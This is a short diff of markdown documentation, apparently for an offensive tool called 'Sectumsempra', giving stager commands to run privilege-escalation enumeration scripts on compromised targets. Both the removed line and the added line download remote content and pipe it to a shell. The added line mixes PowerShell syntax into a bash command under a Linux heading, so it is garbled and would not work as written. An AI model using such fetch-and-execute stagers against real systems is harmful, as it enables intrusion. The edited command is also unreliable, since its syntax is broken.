@@ -57,7 +57,7 @@ Execute the payload script compiled by Sectumsempra against the target vulnerabi
 
 **For Linux Targets (LinPEAS Live Memory Stager):**
 ```bash
-curl -sL https://github.com | sh
+curl -sL https://github.com -OutFile winpeas.exe; .\winpeas.exe | sh
 ```
 
 **For Windows Targets (WinPEAS Live PowerShell Memory Stager):**
